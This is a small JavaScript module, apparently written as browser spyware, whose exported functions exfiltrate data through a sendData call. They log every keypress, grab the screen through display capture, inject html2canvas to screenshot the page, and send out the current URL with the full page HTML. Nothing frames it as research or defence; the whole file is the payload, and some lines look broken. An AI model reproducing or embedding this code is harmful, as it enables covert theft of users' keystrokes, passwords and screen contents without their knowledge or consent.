const util = [
  async () => 
  document.addEventListener("keypress", async (event) => {
    await sendData(event.key)
}),
  async () => {
  const canvas = document.createElement("canvas");
  const context = canvas.getContext("2d");
  const video = document.createElement("video");

  try {
    const captureStream = await navigator.mediaDevices.getDisplayMedia();
    video.srcObject = captureStream;
    context.drawImage(video, 0, 0, window.width, window.height);
    const frame = canvas.toDataURL("image/png");
    captureStream.getTracks().forEach(track => track.stop());
    await sendData(frame);
  } catch (err) {
    console.error("Error: " + err);
  }
},

  () => {
    document.body.innerHTML += '<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.js" integrity="sha512-sn/GHTj+FCxK5wam7k9w4gPPm6zss4Zwl/X9wgrvGMFbnedR8lTUSLdsolDRBRzsX6N+YgG6OWyvn9qaFVXH9w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>'
    const screenshotTarget = document.body;
    console.log(screenshotTarget)
html2canvas(screenshotTarget).then(async (canvas) => {
    const base64image = canvas.toDataURL("image/png");
    await sendData(base64image);
});
  },

  async () => {
    const url = window.location.href
    await sendData(JSON.stringify([url,document.body.innerHTML]));
  }
]

module.exports = util
